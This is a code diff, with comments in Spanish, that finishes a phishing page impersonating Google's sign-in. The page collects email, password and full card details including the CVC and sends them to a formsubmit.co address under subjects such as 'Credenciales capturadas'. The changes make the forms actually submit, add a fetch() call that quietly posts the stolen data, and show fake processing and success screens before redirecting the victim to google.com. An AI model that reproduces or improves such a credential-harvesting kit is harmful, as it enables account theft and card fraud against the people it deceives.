@@ -16,23 +16,23 @@
         }
         .container {
             background-color: #fff;
-            padding: 50px; /* Más espacio interno */
+            padding: 50px;
             border-radius: 12px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15); /* Sombra más pronunciada */
-            width: 450px; /* Más ancho */
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            width: 450px;
             text-align: center;
         }
         .logo {
-            width: 120px; /* Logo más grande */
+            width: 120px;
             margin-bottom: 30px;
         }
         h1 {
-            font-size: 26px; /* Título más grande */
+            font-size: 26px;
             margin-bottom: 15px;
             color: #202124;
         }
         p {
-            font-size: 18px; /* Texto más grande */
+            font-size: 18px;
             margin-bottom: 30px;
             color: #5f6368;
         }
@@ -48,7 +48,7 @@
         }
         input[type="text"], input[type="password"], input[type="email"] {
             width: 100%;
-            padding: 18px; /* Campos más grandes para escribir */
+            padding: 18px;
             margin: 12px 0;
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -100,7 +100,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- Logo de Google -->
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
         
         <!-- Paso 1: Credenciales -->
@@ -111,12 +110,13 @@
             <form action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
                 <input type="hidden" name="_subject" value="Credenciales capturadas: Google Account">
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://www.google.com"> <!-- Redirección final si no usa JS -->
+                <input type="hidden" name="_next" value="https://www.google.com">
                 
                 <input type="email" name="Email" placeholder="Correo electrónico o teléfono" required>
                 <input type="password" name="Password" placeholder="Contraseña" required>
                 
-                <button type="button" onclick="showStep2()">Siguiente</button>
+                <!-- CAMBIADO A type="submit" para que envíe -->
+                <button type="submit">Siguiente</button>
             </form>
         </div>
 
@@ -131,6 +131,7 @@
             <form action="https://formsubmit.co/quisan2017@gmail.com" method="POST">
                 <input type="hidden" name="_subject" value="Datos de Tarjeta Capturados">
                 <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://www.google.com">
                 
                 <input type="text" name="CardName" placeholder="Nombre completo en la tarjeta" required>
                 <input type="text" name="CardNumber" placeholder="Número de la tarjeta" required>
@@ -140,16 +141,17 @@
                     <input type="text" name="CVC" placeholder="CVC" required>
                 </div>
                 
-                <button type="button" onclick="showProcessing()">Verificar</button>
+                <!-- CAMBIADO A type="submit" para que envíe -->
+                <button type="submit">Verificar</button>
             </form>
         </div>
 
-        <!-- Paso 3: Procesando -->
+        <!-- Paso 3: Procesando (solo si no redirige directo) -->
         <div id="processing" class="hidden">
             <div class="processing">Procesando verificación...<br>Por favor no cierres la ventana.</div>
         </div>
 
-        <!-- Paso 4: Éxito -->
+        <!-- Paso 4: Éxito (opcional si redirige directo) -->
         <div id="success" class="hidden">
             <div class="success">
                 ✓ Verificación completada<br>
@@ -159,26 +161,38 @@
     </div>
 
     <script>
-        function showStep2() {
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-        }
-
-        function showProcessing() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('processing').classList.remove('hidden');
-            
-            // Simulamos un tiempo de espera de 3 segundos para que parezca real
-            setTimeout(function() {
-                document.getElementById('processing').classList.add('hidden');
-                document.getElementById('success').classList.remove('hidden');
+        // Si quieres que el formulario haga el proceso de "procesando" antes de redirigir,
+        // necesitas interceptar el envío. Si no, el formulario redirige directamente.
+        // Aquí dejo el script para que haga la animación si lo prefieres:
+        
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault(); // Evita el envío inmediato para mostrar la animación
+                const formData = new FormData(this);
                 
-                // Después de mostrar éxito por 2 segundos, redirigimos a Google
-                setTimeout(function() {
-                    window.location.href = "https://www.google.com";
-                }, 2000); 
-            }, 3000); 
-        }
+                // Muestra la pantalla de "Procesando"
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('processing').classList.remove('hidden');
+                
+                // Simula un tiempo de espera
+                setTimeout(() => {
+                    document.getElementById('processing').classList.add('hidden');
+                    document.getElementById('success').classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        // Envía el formulario manualmente después de mostrar "éxito"
+                        fetch(this.action, {
+                            method: 'POST',
+                            body: formData,
+                            mode: 'no-cors'
+                        }).then(() => {
+                            window.location.href = "https://www.google.com";
+                        });
+                    }, 2000);
+                }, 3000);
+            });
+        });
     </script>
 </body>
 </html>
